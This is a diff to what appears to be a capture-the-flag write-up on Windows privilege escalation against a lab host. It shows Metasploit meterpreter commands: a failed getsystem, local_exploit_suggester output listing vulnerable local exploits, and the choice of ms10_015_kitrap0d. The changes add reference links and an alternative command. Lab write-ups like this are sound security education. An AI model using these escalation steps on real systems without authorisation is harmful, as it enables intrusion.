@@ -412,7 +412,8 @@ meterpreter > getsystem
 ```
 Ah shit, getsystem didn't work.
 
-It's time to to do some research! [Research source, under Post Modules](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
+It's time to to do some research! [Research source, under Post Modules](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html).
+We also see a [Rapid 7 guide on `local_exploit_suggester`](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/). 
 ```
 meterpreter > run post/multi/recon/local_exploit_suggester
 
@@ -432,6 +433,8 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
 [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 ```
+We could've used `meterpreter > run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true` as well.
+
 We'll try `exploit/windows/local/ms10_015_kitrap0d` on the meterpreter session, as we've used/seen this before and as a result more familiar with it.
 ```
 msf5 > use exploit/windows/local/ms10_015_kitrap0d
